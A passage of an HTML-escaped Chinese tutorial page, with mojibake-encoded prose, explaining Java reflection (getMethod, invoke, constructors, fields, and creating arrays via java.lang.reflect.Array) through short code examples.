&lt;/div>&lt;p>getMethodæ–¹æ³•è¿”å›ä¸€ä¸ªç‰¹å®šçš„æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åç§°ï¼Œåé¢çš„å‚æ•°ä¸ºæ–¹æ³•çš„å‚æ•°å¯¹åº”Classçš„å¯¹è±¡&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">public Method getMethod(String name, Class&amp;lt;?&amp;gt;... parameterTypes)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>eg:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">java.lang.reflect.InvocationTargetException&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">java.lang.reflect.Method&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">test&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">test1&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">InstantiationException&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">NoSuchMethodException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">InvocationTargetException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">methodClass&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Object&lt;/span> &lt;span class="n">object&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newInstance&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">methods&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMethods&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">declaredMethods&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDeclaredMethods&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMethod&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;add&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//è·å–addæ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;getMethodsè·å–çš„æ–¹æ³•ï¼š&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Method&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;getDeclaredMethodsè·å–çš„æ–¹æ³•ï¼š&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Method&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">declaredMethods&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test1&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>&lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">e&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">printStackTrace&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">class&lt;/span> &lt;span class="nc">methodClass&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">fuck&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">3&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">sub&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180725151348.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>è·å–æ„é€ å™¨ä¿¡æ¯&lt;/p>
&lt;p>é€šè¿‡Classç±»çš„getConstructoræ–¹æ³•å¾—åˆ°Constructorç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œè€ŒConstructorç±»æœ‰ä¸€ä¸ªnewInstanceæ–¹æ³•å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡å®ä¾‹:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="n">T&lt;/span> &lt;span class="nf">newInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="n">initargs&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>è·å–ç±»çš„æˆå‘˜å­—æ®µä¿¡æ¯&lt;/p>
&lt;p>&lt;code>getFiled&lt;/code>: è®¿é—®å…¬æœ‰çš„æˆå‘˜å˜é‡&lt;/p>
&lt;p>&lt;code>getDeclaredField&lt;/code>ï¼šæ‰€æœ‰å·²å£°æ˜çš„æˆå‘˜å˜é‡ã€‚ä½†ä¸èƒ½å¾—åˆ°å…¶çˆ¶ç±»çš„æˆå‘˜å˜é‡&lt;/p>
&lt;p>&lt;code>getFileds&lt;/code>å’Œ&lt;code>getDeclaredFields&lt;/code>ç”¨æ³•åŒä¸Šï¼ˆå‚ç…§Methodï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒç”¨æ–¹æ³•&lt;/p>
&lt;p>è·å–åˆ°æ–¹æ³•åä½¿ç”¨invoke()æ–¹æ³•æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">...&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">IllegalArgumentException&lt;/span>&lt;span class="o">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">InvocationTargetException&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>egï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">test1&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">InstantiationException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">NoSuchMethodException&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">InvocationTargetException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">klass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">methodClass&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//åˆ›å»ºmethodClassçš„å®ä¾‹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">klass&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newInstance&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è·å–methodClassç±»çš„addæ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">klass&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMethod&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;add&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è°ƒç”¨methodå¯¹åº”çš„æ–¹æ³• =&amp;gt; add(1,4)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">println&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">class&lt;/span> &lt;span class="nc">methodClass&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">fuck&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">3&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">sub&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>åˆ›å»ºæ•°ç»„&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">testArray&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">ClassNotFoundException&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;?&amp;gt;&lt;/span> &lt;span class="n">cls&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">forName&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;java.lang.String&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Object&lt;/span> &lt;span class="n">array&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">cls&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">25&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//é€šè¿‡Array.newInstance()
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//å¾€æ•°ç»„é‡Œæ·»åŠ å†…å®¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">set&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;hello&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//Arrayç±»ä¸ºjava.lang.reflect.Array
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">set&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;Java&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">set&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;fuck&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">set&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">3&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;Scala&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Array&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">set&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">array&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="s">&amp;#34;Clojure&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//è·å–æŸä¸€é¡¹çš„å†…å®¹
